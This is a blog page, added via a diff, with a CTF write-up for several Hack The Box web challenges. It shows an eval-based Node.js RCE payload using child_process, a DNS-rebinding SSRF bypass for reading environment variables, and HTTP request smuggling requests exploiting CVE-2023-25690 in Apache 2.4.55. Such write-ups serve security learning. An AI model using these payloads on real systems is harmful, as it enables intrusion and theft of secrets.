@@ -1,0 +1,665 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="jscalc In the mysterious depths of the digital sea, a specialized JavaScript  calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod">
+<meta property="og:type" content="article">
+<meta property="og:title" content="htb-2">
+<meta property="og:url" content="http://example.com/2024/05/15/htb-2/index.html">
+<meta property="og:site_name" content="p4d0rn&#39;s Labyrinth">
+<meta property="og:description" content="jscalc In the mysterious depths of the digital sea, a specialized JavaScript  calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-05-15T10:47:48.000Z">
+<meta property="article:modified_time" content="2024-05-15T12:16:35.551Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>htb-2 - p4d0rn&#39;s Labyrinth</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>p4d0rn&#39;s labyrinth</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="htb-2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-15 18:47" pubdate>
+          2024年5月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">htb-2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="jscalc"><a href="#jscalc" class="headerlink" title="jscalc"></a>jscalc</h1><blockquote>
+<p>In the mysterious depths of the digital sea, a specialized JavaScript  calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for  everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑</p>
+</blockquote>
+<p>Js code splice leads to RCE.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Calculator</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../helpers/calculatorHelper&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">response</span> = data =&gt; (&#123; <span class="hljs-attr">message</span>: data &#125;);<br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/calculate&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>	<span class="hljs-keyword">let</span> &#123; formula &#125; = req.<span class="hljs-property">body</span>;<br>	<span class="hljs-keyword">if</span> (formula) &#123;<br>		result = <span class="hljs-title class_">Calculator</span>.<span class="hljs-title function_">calculate</span>(formula);<br>		<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(result));<br>	&#125;<br>	<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing parameters&#x27;</span>));<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-title function_">calculate</span>(<span class="hljs-params">formula</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(<span class="hljs-string">`(function() &#123; return <span class="hljs-subst">$&#123; formula &#125;</span> ;&#125;())`</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">SyntaxError</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Something went wrong!&#x27;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;formula&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;cat /f* &gt; /app/static/flag&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;formula&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;require(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;).toString()&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>HTB&#123;c4lcul4t3d_my_w4y_thr0ugh_rc3&#125;</code></p>
+<h1 id="ProxyAsAService"><a href="#ProxyAsAService" class="headerlink" title="ProxyAsAService"></a>ProxyAsAService</h1><blockquote>
+<p>Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone, everywhere.</p>
+</blockquote>
+<p>Very ez SSRF. Flag is in the environment variable.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Blueprint, request, Response, jsonify, redirect, url_for<br><span class="hljs-keyword">from</span> application.util <span class="hljs-keyword">import</span> is_from_localhost, proxy_req<br><span class="hljs-keyword">import</span> random, os<br><br>SITE_NAME = <span class="hljs-string">&#x27;reddit.com&#x27;</span><br><br>proxy_api = Blueprint(<span class="hljs-string">&#x27;proxy_api&#x27;</span>, __name__)<br>debug     = Blueprint(<span class="hljs-string">&#x27;debug&#x27;</span>, __name__)<br><br><br><span class="hljs-meta">@proxy_api.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy</span>():<br>    url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url:<br>        cat_meme_subreddits = [<br>            <span class="hljs-string">&#x27;/r/cats/&#x27;</span>,<br>            <span class="hljs-string">&#x27;/r/catpictures&#x27;</span>,<br>            <span class="hljs-string">&#x27;/r/catvideos/&#x27;</span><br>        ]<br><br>        random_subreddit = random.choice(cat_meme_subreddits)<br><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;.proxy&#x27;</span>, url=random_subreddit))<br>    <br>    target_url = <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;SITE_NAME&#125;</span><span class="hljs-subst">&#123;url&#125;</span>&#x27;</span><br>    <span class="hljs-built_in">print</span>(target_url)<br>    response, headers = proxy_req(target_url)<br><br>    <span class="hljs-keyword">return</span> Response(response.content, response.status_code, headers.items())<br><br><span class="hljs-meta">@debug.route(<span class="hljs-params"><span class="hljs-string">&#x27;/environment&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-meta">@is_from_localhost</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug_environment</span>():<br>    environment_info = &#123;<br>        <span class="hljs-string">&#x27;Environment variables&#x27;</span>: <span class="hljs-built_in">dict</span>(os.environ),<br>        <span class="hljs-string">&#x27;Request headers&#x27;</span>: <span class="hljs-built_in">dict</span>(request.headers)<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> jsonify(environment_info)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request, abort<br><span class="hljs-keyword">import</span> functools, requests<br><br>RESTRICTED_URLS = [<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;127.&#x27;</span>, <span class="hljs-string">&#x27;192.168.&#x27;</span>, <span class="hljs-string">&#x27;10.&#x27;</span>, <span class="hljs-string">&#x27;172.&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_safe_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">for</span> restricted_url <span class="hljs-keyword">in</span> RESTRICTED_URLS:<br>        <span class="hljs-keyword">if</span> restricted_url <span class="hljs-keyword">in</span> url:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_from_localhost</span>(<span class="hljs-params">func</span>):<br><span class="hljs-meta">    @functools.wraps(<span class="hljs-params">func</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_ip</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> request.remote_addr != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>            <span class="hljs-keyword">return</span> abort(<span class="hljs-number">403</span>)<br>        <span class="hljs-keyword">return</span> func(*args, **kwargs)<br>    <span class="hljs-keyword">return</span> check_ip<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy_req</span>(<span class="hljs-params">url</span>):    <br>    method = request.method<br>    headers =  &#123;<br>        key: value <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> request.headers <span class="hljs-keyword">if</span> key.lower() <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;x-csrf-token&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>, <span class="hljs-string">&#x27;referer&#x27;</span>]<br>    &#125;<br>    data = request.get_data()<br><br>    response = requests.request(<br>        method,<br>        url,<br>        headers=headers,<br>        data=data,<br>        verify=<span class="hljs-literal">False</span><br>    )<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_safe_url(url) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> is_safe_url(response.url):<br>        <span class="hljs-keyword">return</span> abort(<span class="hljs-number">403</span>)<br>    <br>    <span class="hljs-keyword">return</span> response, headers<br></code></pre></td></tr></table></figure>
+
+<p>Use this tool to rebind DNS <code>https://lock.cmpxchg8b.com/rebinder.html</code></p>
+<p><code>7f000001.c0a80001.rbndr.us</code>will point to <code>127.0.0.1</code></p>
+<p><code>?url=@7f000001.c0a80001.rbndr.us:1337/debug/environment</code></p>
+<p><code>HTB&#123;fl4gs_4s_4_S3rv1c3&#125;</code></p>
+<h1 id="ApacheBlaze"><a href="#ApacheBlaze" class="headerlink" title="ApacheBlaze"></a>ApacheBlaze</h1><blockquote>
+<p>Step into the ApacheBlaze universe, a world of arcade clicky games.  Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you’ll need to  crack a puzzle.</p>
+</blockquote>
+<p>The Apache httpd version is <code>2.4.55</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>] = &#123;<span class="hljs-string">&#x27;magic_click&#x27;</span>, <span class="hljs-string">&#x27;click_mania&#x27;</span>, <span class="hljs-string">&#x27;hyper_clicker&#x27;</span>, <span class="hljs-string">&#x27;click_topia&#x27;</span>&#125;<br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = <span class="hljs-string">&#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    game = request.args.get(<span class="hljs-string">&#x27;game&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> game:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Empty game name is not supported!.&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Invalid game name!&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game == <span class="hljs-string">&#x27;click_topia&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-Host&#x27;</span>) == <span class="hljs-string">&#x27;dev.apacheblaze.local&#x27;</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;</span>&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently unavailable due to internal maintenance.&#x27;</span><br>        &#125;), <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure>
+
+<p>We need the <code>X-Forwarded-Host</code> header to be <code>dev.apacheblaze.local</code></p>
+<p>However the Apache reverse proxy will overwrite this header field</p>
+<p>In Apache http server from 2.4.0 to 2.4.55, some mod_proxy configuration allows http request smuggling.</p>
+<p>For example:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs conf">RewriteEngine on<br><br>RewriteRule &quot;^/here/(.*)&quot; &quot;http://example.com:8080/elsewhere?$1&quot;; [P]<br><br>ProxyPassReverse /here/ http://example.com:8080/<br></code></pre></td></tr></table></figure>
+
+<p>To leverage the HTTP Request Smuggling vulnerability (CVE-2023-25690),  we aim to manipulate the handling of the X-Forwarded-Host header by  embedding a second request within the first. This technique relies on  the <code>\r\n\r\n</code> sequence to split the requests, effectively bypassing the  appending behavior of the reverse proxy and load balancer operating on  ports 1337 and 8080</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">&quot;http://94.237.54.214:32821/api/games/click_topia</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>dev.apacheblaze.local<br><br><span class="language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/&quot;</span> <span class="hljs-meta">HTTP/1.1</span></span><br><span class="language-http"><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>94.237.54.214:32821</span><br></code></pre></td></tr></table></figure>
+
+<p>The quoted part will be urlencoded.</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">http://94.237.54.214:32821/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>94.237.54.214:32821<br></code></pre></td></tr></table></figure>
+
+<h1 id="JerryTok"><a href="#JerryTok" class="headerlink" title="JerryTok"></a>JerryTok</h1><blockquote>
+<p>Welcome to JerryTok, your portal to the nearest jerryboree, where  mediocrity is celebrated! Dive into the daily escapades of the  wonderfully average, from mundane mishaps to modest triumphs. Share your moments, connect, and laugh as you find glory in the ordinary. Join now and embrace the delightfully dull at your local jerryboree!</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>htb-2</div>
+      <div>http://example.com/2024/05/15/htb-2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/27/d3_2024/" title="D3CTF 2024 wp">
+                        <span class="hidden-mobile">D3CTF 2024 wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
